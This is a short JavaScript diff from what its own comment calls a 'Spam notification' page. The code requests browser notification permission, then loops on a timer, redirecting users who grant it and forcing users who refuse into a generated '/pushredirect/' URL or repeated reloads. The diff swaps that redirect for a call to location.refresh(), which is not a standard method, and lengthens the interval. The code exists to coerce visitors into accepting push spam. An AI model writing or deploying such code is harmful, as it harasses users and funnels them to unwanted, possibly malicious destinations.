@@ -15,14 +15,15 @@ return "https://ww"+ran+"." + domain + "/pushredirect/"+location.href.split("pus
 // Spam notification acess window
 
 Notification.requestPermission()
-setInterval(()=>{
+setInterval(function(){
 
 
 if (Notification.permission === "granted") {
     location.href = dect;
   } else if (Notification.permission === "denied") {
-    location.href = gencode();
+    // location.href = gencode();
+       location.refresh();
 }
 
 
-},5000);
+},8000);
